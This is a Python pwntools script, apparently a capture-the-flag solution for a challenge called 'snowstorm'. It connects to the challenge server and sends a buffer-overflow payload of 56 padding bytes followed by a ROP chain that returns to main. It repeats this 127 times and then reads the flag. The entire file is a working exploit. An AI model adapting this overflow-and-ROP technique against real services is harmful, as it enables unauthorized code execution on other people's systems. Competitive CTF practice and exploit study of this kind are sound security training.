import os
import pwn

def main():
    exe_path: str = f"{os.path.dirname(__file__)}/snowstorm"
    hostname: str = "snowstorm.challs.srdnlen.it"
    port: int | str = "1089"
    ssl: bool = False

    exe = pwn.ELF(exe_path)
    pwn.context.binary = exe
    io = pwn.remote(hostname, port, ssl=ssl)
    
    rop = pwn.ROP(exe)
    rop.raw(b"a"*(40+4+4+8))
    rop.call("main")
    payload = rop.chain()

    for _ in range(127):
        io.sendafter(b": ", b"0x40")
        io.sendafter(b"> ", payload)
    io.recvuntil(b"\"\n")
    flag = io.recvuntil(b"}").decode()
    print(flag)

if __name__ == "__main__":
    pwn.context.log_level = "critical"
    main()
